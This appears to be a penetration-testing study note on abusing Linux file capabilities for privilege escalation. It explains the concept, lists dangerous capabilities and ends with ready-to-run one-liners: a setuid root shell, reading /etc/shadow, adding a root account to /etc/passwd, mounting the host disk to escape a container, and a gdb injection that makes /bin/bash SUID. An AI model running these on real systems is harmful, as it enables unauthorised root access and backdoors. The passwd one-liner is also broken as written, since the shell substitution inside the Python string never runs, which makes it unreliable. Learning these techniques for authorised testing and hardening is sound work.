# Linux Capabilities

## Table of Contents

1. [Overview](#overview)
2. [Dangerous Capabilities](#dangerous-capabilities)
3. [How to Find Capabilities](#how-to-find-capabilities)
4. [Exploitation](#exploitation)

---

## Overview

Capabilities are a way to split root privileges into fine-grained units. Instead of giving a binary full root access (SUID), you grant only the specific privileges it needs. For example, `ping` needs to create raw ICMP sockets but doesn't need full root — so it is given `CAP_NET_RAW` instead of being SUID root.

Capabilities can be set on:
- **Files** (stored in extended attributes) — applied when the binary is executed
- **Processes** — inherited or assigned at runtime

From a privesc perspective, if a binary has a dangerous capability set, we can abuse it to escalate privileges without the binary being SUID.

## Dangerous Capabilities

| Capability | What it allows | Privesc potential |
|---|---|---|
| `CAP_SETUID` | Change UID of the process | Directly switch to root (uid 0) |
| `CAP_SETGID` | Change GID of the process | Switch to any group |
| `CAP_DAC_OVERRIDE` | Bypass file read/write permission checks | Read/write any file (e.g., `/etc/shadow`, `/etc/passwd`) |
| `CAP_DAC_READ_SEARCH` | Bypass file read and directory search permissions | Read any file on the system |
| `CAP_CHOWN` | Change file ownership | Take ownership of any file |
| `CAP_FOWNER` | Bypass permission checks on file owner | Modify permissions on any file |
| `CAP_NET_RAW` | Create raw sockets | Sniff traffic, craft packets |
| `CAP_SYS_ADMIN` | Broad admin operations (mount, etc.) | Mount filesystems, escape containers |
| `CAP_SYS_PTRACE` | Trace/debug any process | Inject code into root processes |
| `CAP_NET_BIND_SERVICE` | Bind to privileged ports (<1024) | Impersonate system services |

## How to Find Capabilities

```bash
# Find all binaries with capabilities set
getcap -r / 2>/dev/null

# Check a specific binary
getcap /usr/bin/python3

# View capabilities of a running process
cat /proc/<PID>/status | grep Cap
```

Typical output:

```
/usr/bin/python3 = cap_setuid+ep
/usr/bin/ping = cap_net_raw+ep
```

The flags mean:
- `e` (effective) — capability is active
- `p` (permitted) — capability can be used
- `i` (inheritable) — capability is passed to child processes

## Exploitation

### CAP_SETUID (most direct)

If a binary like `python3` has `cap_setuid+ep`:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### CAP_DAC_OVERRIDE

Read or overwrite any file:

```bash
# Read /etc/shadow
python3 -c 'print(open("/etc/shadow").read())'

# Add a root user to /etc/passwd
python3 -c 'open("/etc/passwd","a").write("hacker:$(openssl passwd -1 pass):0:0::/root:/bin/bash\n")'
```

### CAP_SYS_ADMIN

Mount the host filesystem (useful in container escapes):

```bash
mkdir /tmp/mount
mount /dev/sda1 /tmp/mount
cat /tmp/mount/etc/shadow
```

### CAP_SYS_PTRACE

Inject into a root process using `gdb` or a custom injector:

```bash
# Attach to a root process and execute commands
gdb -p <root_PID> -ex 'call system("chmod +s /bin/bash")' -ex quit
```

### General approach

For any binary with capabilities, check [GTFOBins](https://gtfobins.github.io/) for known exploitation techniques:

```
https://gtfobins.github.io/#+capabilities
```
